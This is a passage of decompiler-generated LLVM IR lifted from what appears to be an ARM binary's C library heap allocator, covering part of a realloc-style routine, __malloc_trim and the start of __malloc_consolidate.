  %v2_14c18 = inttoptr i32 %v1_14c18 to i32*
  %v3_14c18 = load i32, i32* %v2_14c18, align 4
  store i32 %v3_14c18, i32* @r3, align 4
  %v1_14c1c = add i32 %v0_14c08, -8
  store i32 %v1_14c1c, i32* @r7, align 4
  %v9_14c20 = icmp eq i32 %v1_14c1c, %v1_14c20.pre
  br i1 %v9_14c20, label %.thread2, label %dec_label_pc_14c30

.thread2:                                         ; preds = %dec_label_pc_14c18
  %v2_14c24 = and i32 %v3_14c18, -4
  store i32 %v2_14c24, i32* %r3.global-to-local, align 4
  %v2_14c28 = load i32, i32* @r6, align 4
  %v3_14c28 = add i32 %v2_14c28, %v2_14c24
  store i32 %v3_14c28, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14cb8

dec_label_pc_14c30:                               ; preds = %dec_label_pc_14c18
  %v0_14c30 = load i32, i32* @r6, align 4
  %v1_14c30 = add i32 %v0_14c30, -4
  store i32 %v1_14c30, i32* @r2, align 4
  %v3_14c34 = udiv i32 %v1_14c30, 4
  store i32 %v3_14c34, i32* @ip, align 4
  %tmp37 = and i32 %v1_14c30, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_14c3c = icmp ult i32 %v1_14c30, 36
  %v3_14c3c = or i1 %tmp38, %v2_14c3c
  %v0_14c4c = load i32, i32* @r5, align 4
  br i1 %v3_14c3c, label %dec_label_pc_14c4c, label %dec_label_pc_14c40

dec_label_pc_14c40:                               ; preds = %dec_label_pc_14c30
  store i32 %v0_14c4c, i32* @r1, align 4
  %v0_14c44 = call i32 @memcpy()
  store i32 %v0_14c44, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_14c4c:                               ; preds = %dec_label_pc_14c30
  %v1_14c4c = inttoptr i32 %v0_14c4c to i32*
  %v2_14c4c = load i32, i32* %v1_14c4c, align 4
  store i32 %v2_14c4c, i32* %r3.global-to-local, align 4
  %v2_14c50 = inttoptr i32 %v0_14c08 to i32*
  store i32 %v2_14c4c, i32* %v2_14c50, align 4
  %v0_14c54 = load i32, i32* @r5, align 4
  %v1_14c54 = add i32 %v0_14c54, 4
  %v2_14c54 = inttoptr i32 %v1_14c54 to i32*
  %v3_14c54 = load i32, i32* %v2_14c54, align 4
  store i32 %v3_14c54, i32* %r3.global-to-local, align 4
  %v1_14c58 = load i32, i32* %r1.global-to-local, align 4
  %v2_14c58 = add i32 %v1_14c58, 4
  %v3_14c58 = inttoptr i32 %v2_14c58 to i32*
  store i32 %v3_14c54, i32* %v3_14c58, align 4
  %v0_14c5c = load i32, i32* @r5, align 4
  %v1_14c5c = add i32 %v0_14c5c, 8
  %v2_14c5c = inttoptr i32 %v1_14c5c to i32*
  %v3_14c5c = load i32, i32* %v2_14c5c, align 4
  store i32 %v3_14c5c, i32* %r3.global-to-local, align 4
  %v0_14c60 = load i32, i32* @ip, align 4
  %v1_14c64 = load i32, i32* %r1.global-to-local, align 4
  %v2_14c64 = add i32 %v1_14c64, 8
  %v3_14c64 = inttoptr i32 %v2_14c64 to i32*
  store i32 %v3_14c5c, i32* %v3_14c64, align 4
  %tmp39 = icmp ult i32 %v0_14c60, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_14c6c

dec_label_pc_14c6c:                               ; preds = %dec_label_pc_14c4c
  %v0_14c6c = load i32, i32* @r5, align 4
  %v1_14c6c = add i32 %v0_14c6c, 12
  %v2_14c6c = inttoptr i32 %v1_14c6c to i32*
  %v3_14c6c = load i32, i32* %v2_14c6c, align 4
  store i32 %v3_14c6c, i32* %r3.global-to-local, align 4
  %v1_14c70 = load i32, i32* %r1.global-to-local, align 4
  %v2_14c70 = add i32 %v1_14c70, 12
  %v3_14c70 = inttoptr i32 %v2_14c70 to i32*
  store i32 %v3_14c6c, i32* %v3_14c70, align 4
  %v0_14c74 = load i32, i32* @r5, align 4
  %v1_14c74 = add i32 %v0_14c74, 16
  %v2_14c74 = inttoptr i32 %v1_14c74 to i32*
  %v3_14c74 = load i32, i32* %v2_14c74, align 4
  store i32 %v3_14c74, i32* %r3.global-to-local, align 4
  %v0_14c78 = load i32, i32* @ip, align 4
  %v1_14c7c = load i32, i32* %r1.global-to-local, align 4
  %v2_14c7c = add i32 %v1_14c7c, 16
  %v3_14c7c = inttoptr i32 %v2_14c7c to i32*
  store i32 %v3_14c74, i32* %v3_14c7c, align 4
  %tmp40 = icmp ult i32 %v0_14c78, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_14c84

dec_label_pc_14c84:                               ; preds = %dec_label_pc_14c6c
  %v0_14c84 = load i32, i32* @r5, align 4
  %v1_14c84 = add i32 %v0_14c84, 20
  %v2_14c84 = inttoptr i32 %v1_14c84 to i32*
  %v3_14c84 = load i32, i32* %v2_14c84, align 4
  store i32 %v3_14c84, i32* %r3.global-to-local, align 4
  %v1_14c88 = load i32, i32* %r1.global-to-local, align 4
  %v2_14c88 = add i32 %v1_14c88, 20
  %v3_14c88 = inttoptr i32 %v2_14c88 to i32*
  store i32 %v3_14c84, i32* %v3_14c88, align 4
  %v0_14c8c = load i32, i32* @r5, align 4
  %v1_14c8c = add i32 %v0_14c8c, 24
  %v2_14c8c = inttoptr i32 %v1_14c8c to i32*
  %v3_14c8c = load i32, i32* %v2_14c8c, align 4
  store i32 %v3_14c8c, i32* %r3.global-to-local, align 4
  %v1_14c90 = load i32, i32* %r1.global-to-local, align 4
  %v2_14c90 = add i32 %v1_14c90, 24
  %v3_14c90 = inttoptr i32 %v2_14c90 to i32*
  store i32 %v3_14c8c, i32* %v3_14c90, align 4
  %v0_14c94 = load i32, i32* @ip, align 4
  %v7_14c94 = icmp eq i32 %v0_14c94, 9
  br i1 %v7_14c94, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_14c84
  %v1_14c98 = load i32, i32* @r5, align 4
  %v2_14c98 = add i32 %v1_14c98, 28
  %v3_14c98 = inttoptr i32 %v2_14c98 to i32*
  %v4_14c98 = load i32, i32* %v3_14c98, align 4
  store i32 %v4_14c98, i32* %r3.global-to-local, align 4
  %v2_14c9c = load i32, i32* %r1.global-to-local, align 4
  %v3_14c9c = add i32 %v2_14c9c, 28
  %v4_14c9c = inttoptr i32 %v3_14c9c to i32*
  store i32 %v4_14c98, i32* %v4_14c9c, align 4
  %v1_14ca0 = load i32, i32* @r5, align 4
  %v2_14ca0 = add i32 %v1_14ca0, 32
  %v3_14ca0 = inttoptr i32 %v2_14ca0 to i32*
  %v4_14ca0 = load i32, i32* %v3_14ca0, align 4
  store i32 %v4_14ca0, i32* %r3.global-to-local, align 4
  %v2_14ca4 = load i32, i32* %r1.global-to-local, align 4
  %v3_14ca4 = add i32 %v2_14ca4, 32
  %v4_14ca4 = inttoptr i32 %v3_14ca4 to i32*
  store i32 %v4_14ca0, i32* %v4_14ca4, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_14c84, %dec_label_pc_14c6c, %dec_label_pc_14c4c, %dec_label_pc_14c40, %bb32
  %v0_14ca8 = load i32, i32* @r5, align 4
  store i32 %v0_14ca8, i32* @r0, align 4
  %v0_14cac = call i32 @free()
  store i32 %v0_14cac, i32* %r0.global-to-local, align 4
  %v0_14cb0 = load i32, i32* @r7, align 4
  %v1_14cb0 = add i32 %v0_14cb0, 8
  store i32 %v1_14cb0, i32* @r4, align 4
  br label %dec_label_pc_14dec

dec_label_pc_14cb8:                               ; preds = %bb30, %.thread2, %dec_label_pc_14bf8
  %v0_14ccc = phi i32 [ %v3_14c28, %.thread2 ], [ %v1_14b40, %bb30 ], [ %v1_14cb8.pre, %dec_label_pc_14bf8 ]
  %v0_14cb8 = load i32, i32* @sb, align 4
  %v2_14cb8 = sub i32 %v0_14ccc, %v0_14cb8
  store i32 %v2_14cb8, i32* %r1.global-to-local, align 4
  %v0_14cc0 = load i32, i32* @sl, align 4
  %v1_14cc0 = add i32 %v0_14cc0, 4
  %v2_14cc0 = inttoptr i32 %v1_14cc0 to i32*
  %v3_14cc0 = load i32, i32* %v2_14cc0, align 4
  %tmp41 = icmp ugt i32 %v2_14cb8, 15
  %v1_14ce8 = urem i32 %v3_14cc0, 2
  store i32 %v1_14ce8, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_14ce8, label %dec_label_pc_14cc8

dec_label_pc_14cc8:                               ; preds = %dec_label_pc_14cb8
  %v2_14ccc = or i32 %v1_14ce8, %v0_14ccc
  store i32 %v2_14ccc, i32* %r3.global-to-local, align 4
  store i32 %v2_14ccc, i32* %v2_14cc0, align 4
  %v0_14cd4 = load i32, i32* @sl, align 4
  %v1_14cd4 = load i32, i32* %r0.global-to-local, align 4
  %v2_14cd4 = add i32 %v1_14cd4, %v0_14cd4
  store i32 %v2_14cd4, i32* %r2.global-to-local, align 4
  %v1_14cd8 = add i32 %v2_14cd4, 4
  %v2_14cd8 = inttoptr i32 %v1_14cd8 to i32*
  %v3_14cd8 = load i32, i32* %v2_14cd8, align 4
  %v1_14cdc = or i32 %v3_14cd8, 1
  store i32 %v1_14cdc, i32* %r3.global-to-local, align 4
  store i32 %v1_14cdc, i32* %v2_14cd8, align 4
  br label %dec_label_pc_14d18

dec_label_pc_14ce8:                               ; preds = %dec_label_pc_14cb8
  %v2_14cec = add i32 %v0_14cc0, %v0_14cb8
  store i32 %v2_14cec, i32* %r0.global-to-local, align 4
  %v2_14cf0 = or i32 %v1_14ce8, %v0_14cb8
  store i32 %v2_14cf0, i32* %r3.global-to-local, align 4
  %v1_14cf4 = or i32 %v2_14cb8, 1
  store i32 %v1_14cf4, i32* %r2.global-to-local, align 4
  store i32 %v2_14cf0, i32* %v2_14cc0, align 4
  %v0_14cfc = load i32, i32* %r2.global-to-local, align 4
  %v1_14cfc = load i32, i32* %r0.global-to-local, align 4
  %v2_14cfc = add i32 %v1_14cfc, 4
  %v3_14cfc = inttoptr i32 %v2_14cfc to i32*
  store i32 %v0_14cfc, i32* %v3_14cfc, align 4
  %v0_14d00 = load i32, i32* %r0.global-to-local, align 4
  %v1_14d00 = load i32, i32* %r1.global-to-local, align 4
  %v2_14d00 = add i32 %v1_14d00, %v0_14d00
  store i32 %v2_14d00, i32* %r2.global-to-local, align 4
  %v1_14d04 = add i32 %v2_14d00, 4
  %v2_14d04 = inttoptr i32 %v1_14d04 to i32*
  %v3_14d04 = load i32, i32* %v2_14d04, align 4
  %v1_14d08 = or i32 %v3_14d04, 1
  store i32 %v1_14d08, i32* %r3.global-to-local, align 4
  store i32 %v1_14d08, i32* %v2_14d04, align 4
  %v0_14d10 = load i32, i32* %r0.global-to-local, align 4
  %v1_14d10 = add i32 %v0_14d10, 8
  store i32 %v1_14d10, i32* @r0, align 4
  %v0_14d14 = call i32 @free()
  store i32 %v0_14d14, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14d18

dec_label_pc_14d18:                               ; preds = %dec_label_pc_14cc8, %dec_label_pc_14ce8
  %v0_14d18 = load i32, i32* @sl, align 4
  %v1_14d18 = add i32 %v0_14d18, 8
  store i32 %v1_14d18, i32* @r4, align 4
  br label %dec_label_pc_14dec

dec_label_pc_14d20:                               ; preds = %bb29
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %r1.global-to-local, align 4
  %v4_14d28 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 64) to i32*), align 4
  store i32 %v4_14d28, i32* @r8, align 4
  %v2_14d2c = inttoptr i32 %v1_14b3c to i32*
  %v3_14d2c = load i32, i32* %v2_14d2c, align 4
  store i32 %v3_14d2c, i32* @r4, align 4
  %v1_14d30 = add i32 %v4_14d28, 860
  %v2_14d30 = inttoptr i32 %v1_14d30 to i32*
  %v3_14d30 = load i32, i32* %v2_14d30, align 4
  %v1_14d34 = add i32 %v3_14d2c, 4
  %v1_14d38 = add i32 %v3_14d30, -1
  store i32 %v1_14d38, i32* %r2.global-to-local, align 4
  %v2_14d3c = add i32 %v1_14d34, %v1_14d38
  %v1_14d40 = load i32, i32* @sb, align 4
  %v2_14d40 = add i32 %v2_14d3c, %v1_14d40
  store i32 %v2_14d40, i32* %r3.global-to-local, align 4
  %v2_14d44 = sub i32 0, %v3_14d30
  %v3_14d44 = and i32 %v2_14d40, %v2_14d44
  store i32 %v3_14d44, i32* @r7, align 4
  %v2_14d48 = sub i32 %v3_14d44, %v3_14d2c
  store i32 %v2_14d48, i32* @fp, align 4
  %v9_14d4c = icmp eq i32 %v1_14b40, %v2_14d48
  br i1 %v9_14d4c, label %dec_label_pc_14dc0, label %dec_label_pc_14d54

dec_label_pc_14d54:                               ; preds = %dec_label_pc_14d20
  %v2_14d54 = sub i32 %v1_14b3c, %v3_14d2c
  store i32 %v2_14d54, i32* %r0.global-to-local, align 4
  %v2_14d58 = add i32 %v3_14d2c, %v1_14b40
  store i32 %v2_14d58, i32* %r1.global-to-local, align 4
  store i32 %v3_14d44, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_14d64 = call i32 @mremap(i32 %v2_14d54, i32 %v2_14d58, i32 %v3_14d44, i32 1)
  store i32 %v4_14d64, i32* %r0.global-to-local, align 4
  %v7_14d68 = icmp eq i32 %v4_14d64, -1
  br i1 %v7_14d68, label %dec_label_pc_14db4, label %dec_label_pc_14d70

dec_label_pc_14d70:                               ; preds = %dec_label_pc_14d54
  %v1_14d70 = load i32, i32* @r4, align 4
  %v2_14d70 = add i32 %v1_14d70, %v4_14d64
  store i32 %v2_14d70, i32* %r0.global-to-local, align 4
  %v0_14d74 = load i32, i32* @fp, align 4
  %v1_14d74 = or i32 %v0_14d74, 2
  store i32 %v1_14d74, i32* %r3.global-to-local, align 4
  %v2_14d78 = add i32 %v2_14d70, 4
  %v3_14d78 = inttoptr i32 %v2_14d78 to i32*
  store i32 %v1_14d74, i32* %v3_14d78, align 4
  %v0_14d7c = load i32, i32* @r8, align 4
  %v1_14d7c = add i32 %v0_14d7c, 868
  %v2_14d7c = inttoptr i32 %v1_14d7c to i32*
  %v3_14d7c = load i32, i32* %v2_14d7c, align 4
  store i32 %v3_14d7c, i32* %r3.global-to-local, align 4
  %v1_14d80 = add i32 %v0_14d7c, 880
  %v2_14d80 = inttoptr i32 %v1_14d80 to i32*
  %v3_14d80 = load i32, i32* %v2_14d80, align 4
  store i32 %v3_14d80, i32* %r2.global-to-local, align 4
  %v0_14d84 = load i32, i32* @r6, align 4
  %v2_14d84 = sub i32 %v3_14d7c, %v0_14d84
  store i32 %v2_14d84, i32* %r3.global-to-local, align 4
  %v1_14d88 = load i32, i32* @r7, align 4
  %v2_14d88 = add i32 %v1_14d88, %v2_14d84
  store i32 %v2_14d88, i32* %r1.global-to-local, align 4
  %v1_14d8c = add i32 %v0_14d7c, 872
  %v2_14d8c = inttoptr i32 %v1_14d8c to i32*
  %v3_14d8c = load i32, i32* %v2_14d8c, align 4
  store i32 %v3_14d8c, i32* %r3.global-to-local, align 4
  %v1_14d94 = add i32 %v0_14d7c, 884
  %v2_14d94 = inttoptr i32 %v1_14d94 to i32*
  %v3_14d94 = load i32, i32* %v2_14d94, align 4
  store i32 %v3_14d94, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_14d88, %v3_14d80
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_14d70
  store i32 %v2_14d88, i32* %v2_14d80, align 4
  %v0_14d9c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_14d9c.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_14d70, %bb33
  %v1_14d9c = phi i32 [ %v0_14d7c, %dec_label_pc_14d70 ], [ %v1_14d9c.pre, %bb33 ]
  %v0_14d9c = phi i32 [ %v2_14d88, %dec_label_pc_14d70 ], [ %v0_14d9c.pre, %bb33 ]
  %v2_14d9c = add i32 %v1_14d9c, 868
  %v3_14d9c = inttoptr i32 %v2_14d9c to i32*
  store i32 %v0_14d9c, i32* %v3_14d9c, align 4
  %v0_14da0 = load i32, i32* %r1.global-to-local, align 4
  %v1_14da0 = load i32, i32* %r3.global-to-local, align 4
  %v2_14da0 = add i32 %v1_14da0, %v0_14da0
  store i32 %v2_14da0, i32* %r1.global-to-local, align 4
  %v1_14da4 = load i32, i32* %r2.global-to-local, align 4
  %v0_14da8 = load i32, i32* %r0.global-to-local, align 4
  %v1_14da8 = add i32 %v0_14da8, 8
  store i32 %v1_14da8, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_14da0, %v1_14da4
  br i1 %tmp43, label %bb35, label %dec_label_pc_14dec

bb35:                                             ; preds = %bb34
  %v5_14dac = load i32, i32* @r8, align 4
  %v6_14dac = add i32 %v5_14dac, 884
  %v7_14dac = inttoptr i32 %v6_14dac to i32*
  store i32 %v2_14da0, i32* %v7_14dac, align 4
  br label %dec_label_pc_14dec

dec_label_pc_14db4:                               ; preds = %dec_label_pc_14d54
  %v0_14db4 = load i32, i32* @sb, align 4
  %v1_14db4 = add i32 %v0_14db4, 4
  store i32 %v1_14db4, i32* %r3.global-to-local, align 4
  %v0_14db8 = load i32, i32* @r6, align 4
  %v3_14db8 = icmp ult i32 %v0_14db8, %v1_14db4
  br i1 %v3_14db8, label %dec_label_pc_14dc8, label %dec_label_pc_14db4.dec_label_pc_14dc0_crit_edge

dec_label_pc_14db4.dec_label_pc_14dc0_crit_edge:  ; preds = %dec_label_pc_14db4
  %v0_14dc0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14dc0

dec_label_pc_14dc0:                               ; preds = %dec_label_pc_14db4.dec_label_pc_14dc0_crit_edge, %dec_label_pc_14d20
  %v0_14dc0 = phi i32 [ %v0_14dc0.pre, %dec_label_pc_14db4.dec_label_pc_14dc0_crit_edge ], [ %v0_14b28, %dec_label_pc_14d20 ]
  store i32 %v0_14dc0, i32* @r4, align 4
  br label %dec_label_pc_14dec

dec_label_pc_14dc8:                               ; preds = %dec_label_pc_14db4
  %v1_14dc8 = add i32 %v0_14db4, -7
  store i32 %v1_14dc8, i32* @r0, align 4
  %v0_14dcc = call i32 @malloc()
  store i32 %v0_14dcc, i32* @r0, align 4
  store i32 %v0_14dcc, i32* @r4, align 4
  %v2_14dd0 = icmp eq i32 %v0_14dcc, 0
  br i1 %v2_14dd0, label %dec_label_pc_14dec, label %dec_label_pc_14dd8

dec_label_pc_14dd8:                               ; preds = %dec_label_pc_14dc8
  %v0_14dd8 = load i32, i32* @r6, align 4
  %v1_14dd8 = add i32 %v0_14dd8, -8
  store i32 %v1_14dd8, i32* @r2, align 4
  %v0_14ddc = load i32, i32* @r5, align 4
  store i32 %v0_14ddc, i32* @r1, align 4
  %v0_14de0 = call i32 @memcpy()
  %v0_14de4 = load i32, i32* @r5, align 4
  store i32 %v0_14de4, i32* @r0, align 4
  %v0_14de8 = call i32 @free()
  store i32 %v0_14de8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14dec

dec_label_pc_14dec:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_14dc8, %dec_label_pc_14dc0, %dec_label_pc_14d18, %.thread6, %dec_label_pc_14b88, %dec_label_pc_14dd8
  store i32 %v2_14ad4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %r2.global-to-local, align 4
  %v4_14dfc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 44) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_14dfc)
  br label %dec_label_pc_14e08

dec_label_pc_14e08:                               ; preds = %dec_label_pc_14b08, %dec_label_pc_14ab0, %dec_label_pc_14a98, %dec_label_pc_14dec
  %v0_14e08 = load i32, i32* @r4, align 4
  store i32 %v0_14e08, i32* %r0.global-to-local, align 4
  store i32 %v3_14a78, i32* @r4, align 4
  store i32 %v6_14a78, i32* @r5, align 4
  store i32 %v9_14a78, i32* @r6, align 4
  store i32 %v12_14a78, i32* @r7, align 4
  store i32 %v15_14a78, i32* @r8, align 4
  store i32 %v18_14a78, i32* @sb, align 4
  store i32 %v21_14a78, i32* @sl, align 4
  store i32 %v24_14a78, i32* @fp, align 4
  store i32 %v27_14a78, i32* @lr, align 4
  ret i32 %v0_14e08

; uselistorder directives
  uselistorder i32 %v2_14da0, { 1, 0, 2 }
  uselistorder i32 %v2_14d88, { 1, 2, 0, 3 }
  uselistorder i32 %v4_14d64, { 1, 0, 2 }
  uselistorder i32 %v3_14d44, { 1, 0, 2, 3 }
  uselistorder i32 %v1_14ce8, { 2, 1, 0 }
  uselistorder i32 %v2_14cb8, { 1, 0, 2 }
  uselistorder i32 %v0_14c4c, { 1, 0 }
  uselistorder i32 %v0_14c08, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_14b6c, { 0, 2, 1, 3 }
  uselistorder i32 %v2_14b64, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_14b48, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_14b40, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_14b3c, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_14b2c, { 1, 0 }
  uselistorder i32 %v0_14b28, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_14b00, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 11, 7, 8, 9, 10, 21, 12, 14, 13, 20, 22, 15, 16, 17, 18, 19, 25, 24, 23, 26, 27 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_14e08, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_14dec, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_14d18, { 1, 0 }
  uselistorder label %dec_label_pc_14cb8, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_14c04, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14bf8, { 1, 0 }
  uselistorder label %dec_label_pc_14bf4, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_14e1c(i16* %arg1) local_unnamed_addr {
dec_label_pc_14e1c:
  %v0_14e1c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14e1c, label %.thread3, label %.thread5

.thread3:                                         ; preds = %dec_label_pc_14e1c
  call void @llvm.trap()
  unreachable

.thread5:                                         ; preds = %dec_label_pc_14e1c
  %tmp = ptrtoint i16* %arg1 to i32
  ret i32 %tmp
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_14e38 = add i32 %arg2, 44
  %v2_14e38 = inttoptr i32 %v1_14e38 to i32*
  %v3_14e38 = load i32, i32* %v2_14e38, align 4
  %v12_14e3c = load i32, i32* @r7, align 4
  %v1_14e40 = add i32 %v3_14e38, 4
  %v2_14e40 = inttoptr i32 %v1_14e40 to i32*
  %v3_14e40 = load i32, i32* %v2_14e40, align 4
  %v1_14e44 = add i32 %arg2, 860
  %v2_14e44 = inttoptr i32 %v1_14e44 to i32*
  %v3_14e44 = load i32, i32* %v2_14e44, align 4
  store i32 %v3_14e44, i32* @r4, align 4
  %v1_14e48 = and i32 %v3_14e40, -4
  store i32 %v1_14e48, i32* @r6, align 4
  %v1_14e4c = add i32 %v1_14e48, -17
  %v2_14e50 = add i32 %v1_14e4c, %v3_14e44
  store i32 %arg2, i32* @r5, align 4
  %v2_14e5c = sub i32 %v2_14e50, %arg1
  store i32 %v3_14e44, i32* %r1.global-to-local, align 4
  %v2_14e64 = udiv i32 %v2_14e5c, %v3_14e44
  %v1_14e68 = add i32 %v2_14e64, -1
  store i32 %v1_14e68, i32* %r0.global-to-local, align 4
  %v2_14e6c = mul i32 %v1_14e68, %v3_14e44
  store i32 %v2_14e6c, i32* @r7, align 4
  %v2_14e70 = icmp eq i32 %v2_14e6c, 0
  store i1 %v2_14e70, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_14e6c, 1
  br i1 %tmp8, label %dec_label_pc_14ed8, label %dec_label_pc_14e78

dec_label_pc_14e78:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_14e7c = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_14e7c, i32* %r0.global-to-local, align 4
  %v0_14e80 = load i32, i32* @r5, align 4
  %v1_14e80 = add i32 %v0_14e80, 44
  %v2_14e80 = inttoptr i32 %v1_14e80 to i32*
  %v3_14e80 = load i32, i32* %v2_14e80, align 4
  %v0_14e84 = load i32, i32* @r6, align 4
  %v2_14e84 = add i32 %v0_14e84, %v3_14e80
  %v9_14e88 = icmp eq i32 %v1_14e7c, %v2_14e84
  store i1 %v9_14e88, i1* @cpsr_z, align 1
  store i32 %v1_14e7c, i32* @r4, align 4
  br i1 %v9_14e88, label %dec_label_pc_14e94, label %dec_label_pc_14ed8

dec_label_pc_14e94:                               ; preds = %dec_label_pc_14e78
  %v0_14e94 = load i32, i32* @r7, align 4
  %v1_14e94 = sub i32 0, %v0_14e94
  store i32 %v1_14e94, i32* %r0.global-to-local, align 4
  %v1_14e98 = call i32 @__GI_sbrk(i32 %v1_14e94)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_14ea0 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_14ea0, i32* %r0.global-to-local, align 4
  %v7_14ea4 = icmp eq i32 %v1_14ea0, -1
  store i1 %v7_14ea4, i1* @cpsr_z, align 1
  br i1 %v7_14ea4, label %dec_label_pc_14ed8, label %dec_label_pc_14eac

dec_label_pc_14eac:                               ; preds = %dec_label_pc_14e94
  %v0_14eac = load i32, i32* @r4, align 4
  %v2_14eac = sub i32 %v0_14eac, %v1_14ea0
  store i32 %v2_14eac, i32* %r0.global-to-local, align 4
  %v9_14eac = icmp eq i32 %v0_14eac, %v1_14ea0
  store i1 %v9_14eac, i1* @cpsr_z, align 1
  br i1 %v9_14eac, label %dec_label_pc_14ed8, label %dec_label_pc_14eb4

dec_label_pc_14eb4:                               ; preds = %dec_label_pc_14eac
  %v0_14eb4 = load i32, i32* @r5, align 4
  %v1_14eb4 = add i32 %v0_14eb4, 872
  %v2_14eb4 = inttoptr i32 %v1_14eb4 to i32*
  %v3_14eb4 = load i32, i32* %v2_14eb4, align 4
  %v1_14eb8 = load i32, i32* @r6, align 4
  %v2_14eb8 = sub i32 %v1_14eb8, %v2_14eac
  store i32 %v2_14eb8, i32* %r2.global-to-local, align 4
  %v1_14ebc = add i32 %v0_14eb4, 44
  %v2_14ebc = inttoptr i32 %v1_14ebc to i32*
  %v3_14ebc = load i32, i32* %v2_14ebc, align 4
  store i32 %v3_14ebc, i32* %r1.global-to-local, align 4
  %v2_14ec0 = sub i32 %v3_14eb4, %v2_14eac
  %v1_14ec4 = or i32 %v2_14eb8, 1
  store i32 %v1_14ec4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_14ec0, i32* %v2_14eb4, align 4
  %v0_14ed0 = load i32, i32* %r2.global-to-local, align 4
  %v1_14ed0 = load i32, i32* %r1.global-to-local, align 4
  %v2_14ed0 = add i32 %v1_14ed0, 4
  %v3_14ed0 = inttoptr i32 %v2_14ed0 to i32*
  store i32 %v0_14ed0, i32* %v3_14ed0, align 4
  %v1_14ee4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14edc

dec_label_pc_14ed8:                               ; preds = %dec_label_pc_14e78, %dec_label_pc_14eac, %dec_label_pc_14e94, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14edc

dec_label_pc_14edc:                               ; preds = %dec_label_pc_14eb4, %dec_label_pc_14ed8
  %v1_14ee4 = phi i32 [ %v1_14ee4.pre, %dec_label_pc_14eb4 ], [ 0, %dec_label_pc_14ed8 ]
  store i32 %v12_14e3c, i32* @r7, align 4
  ret i32 %v1_14ee4

; uselistorder directives
  uselistorder i1 %v7_14ea4, { 1, 0 }
  uselistorder i32 %v1_14ea0, { 2, 1, 0, 3 }
  uselistorder i32 %v3_14e44, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_14edc, { 1, 0 }
  uselistorder label %dec_label_pc_14ed8, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
